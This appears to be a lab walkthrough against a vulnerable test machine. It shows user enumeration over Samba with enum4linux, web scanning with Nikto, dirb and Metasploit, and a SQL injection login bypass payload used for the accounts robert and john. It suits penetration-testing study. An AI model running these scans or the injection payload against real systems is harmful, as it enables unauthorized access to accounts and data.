# Samba

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)

 SMB version:Samba 3.0.28a          no public exploit

Enumeration

-------------------------------------------------
Enum4linux

  Enum4linux is a tool for enumerating  information from Windows and Samba systems. It attempts to offer similar  functionality to enum.exe formerly available from www.bindview.com.
It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net, and nmblookup.
Key features:
• RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)
• User listing (When RestrictAnonymous is set to 0 on Windows 2000)
• Listing of group membership information
• Share enumeration
• Detecting if the host is in a workgroup or a domain
• Identifying the remote operating system
• Password policy retrieval

-------------------------------------------------

>enum4linux 192.168.1.6

============================ 
|    Users on 192.168.1.6    |
 ============================ 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)


Users found: nobody, robert, root, john and loneferret.

# Web server

-----------------------------------------------------
using Nikto
 
 Nikto is a popular Web server scanner that  tests Web servers for dangerous files/CGIs, outdated server software  and other issues. It also performs generic and server type specific  checks.
-------------------------------------------------------

>nikto -h 192.168.1.6

![image](https://user-images.githubusercontent.com/24206178/154683737-d600aba7-4791-44fb-8c09-384a202004ab.png)

Apache 2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.

PHP 5.2.4 -2 ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch

This version is vulnarable!!!

Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names.


the vulnerable target machine has the HTTP PUT method allowed us to upload malicious backdoors =>  No it hasn't

----------------------------------------------------

>curl --head 192.168.1.6

HTTP/1.1 200 OK
Date: Thu, 28 Nov 2019 12:15:03 GMT
Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
X-Powered-By: PHP/5.2.4-2ubuntu5.6
Content-Type: text/html

--------------------------------------------------
Using DIRB

DIRB is a Web Content Scanner. It looks  for existing (and/or hidden) Web Objects. It basically works by  launching a dictionary-based attack against a web server and analyzing  the response. DIRB main purpose is to help in professional web  application auditing.

The tool “Dirb” is in-built in Kali  Linux, therefore, Open the terminal and type following command to start  brute force directory attack.
-------------------------------------------------


dirb http://192.168.1.6


GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.6/ ----
+ http://192.168.1.6/cgi-bin/ (CODE:403|SIZE:326)                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.6/images/                                                                                                                                                                         
+ http://192.168.1.6/index (CODE:200|SIZE:1255)                                                                                                                                                                   
+ http://192.168.1.6/index.php (CODE:200|SIZE:1255)                                                                                                                                                               
==> DIRECTORY: http://192.168.1.6/john/                                                                                                                                                                           
+ http://192.168.1.6/logout (CODE:302|SIZE:0)                                                                                                                                                                     
+ http://192.168.1.6/member (CODE:302|SIZE:220)                                                                                                                                                                   
+ http://192.168.1.6/server-status (CODE:403|SIZE:331)     


Intersting Directores found: http://192.168.1.6/john/ 

-------------------------------------

Using Metasploit

-------------------------------------

>use auxiliary/scanner/http/dir_scanner

![image](https://user-images.githubusercontent.com/24206178/154683855-def63afd-8c57-4256-8997-c8adce6f566b.png)

Same result

----------------------------------------------------------

SQL injection

  SQL injection is a technique where a malicious user can inject SQL Commands into an SQL statement via a web page.
  An attacker could bypass  authentication, access, modify and delete data within a database. In  some cases, SQL Injection can even be used to execute commands on the  operating system, potentially allowing an attacker to escalate to more  damaging attacks inside of a network that sits behind a firewall.
  
 ---------------------------------------------------------
 
 username: robert
 password:' or 1=1 -- -

![image](https://user-images.githubusercontent.com/24206178/154683911-96f7e105-26d1-4b0c-bcfc-60bca2642bab.png)

username: john
 password:' or 1=1 -- -
 
 ![image](https://user-images.githubusercontent.com/24206178/154683937-dbe39ba5-a6d3-4bb5-aaeb-d6369fbe362f.png)


Now we have usrnames from SMB

and we have passwords from the web server

Lets go to the ssh
